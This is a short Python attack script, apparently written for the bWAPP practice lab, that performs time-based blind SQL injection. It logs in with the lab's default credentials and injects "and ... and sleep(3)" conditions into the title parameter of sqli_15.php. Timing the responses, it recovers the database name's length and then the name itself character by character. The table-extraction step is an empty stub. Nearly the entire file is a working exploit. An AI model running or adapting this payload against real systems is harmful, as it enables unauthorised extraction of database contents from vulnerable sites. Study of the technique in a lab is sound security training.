#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# Author: QianTian

import requests
import time

login_data = {
    'login': 'bee',
    'password': 'bug',
    'security_level': '0',
    'form': 'submit'
}

url = "http://{}/"
login_tail = "login.php"
target_tail = "sqli_15.php?title=World War Z' and {} and sleep(3) -- &action=search"


class Injector:
    def __init__(self, ip):
        self.ip = ip
        self.seesion = requests.session()
        self.url = url.format(ip)
        self.login_url = self.url + login_tail
        self.target_model = self.url + target_tail
        self.dbname_len = None
        self.dbname = None

    def keep_login(self):
        """保持登陆状态"""
        respon = self.seesion.post(self.login_url, login_data)
        if respon.status_code == 200:
            print("Login Success!")
        else:
            print("Login Fail!")

    def get_dbname_len(self):
        """获取数据库名的长度"""
        for i in range(1, 21):
            elem = 'length(database())=%d' % i
            url = self.target_model.format(elem)
            starttime = time.time()
            respon = self.seesion.get(url)
            endtime = time.time()
            usetime = endtime - starttime
            if usetime > 1:
                self.dbname_len = i
                print("Length os DB name is ", i)
                break

    def get_dbname(self):
        """获取数据库名称"""
        dbname = ''
        for i in range(1, self.dbname_len + 1):
            for j in range(3, 128):
                elem = "ascii(substr(database(),%d,1))=%d" % (i, j)
                url = self.target_model.format(elem)
                starttime = time.time()
                respon = self.seesion.get(url)
                endtime = time.time()
                usetime = endtime - starttime
                if usetime > 1:
                    dbname = dbname + chr(j)
                    break
        self.dbname = dbname
        print(self.dbname)

    def get_table_name(self):
        pass


if __name__ == '__main__':
    tool = Injector('0.0.0.0')
    tool.keep_login()
    tool.get_dbname_len()
    tool.get_dbname()
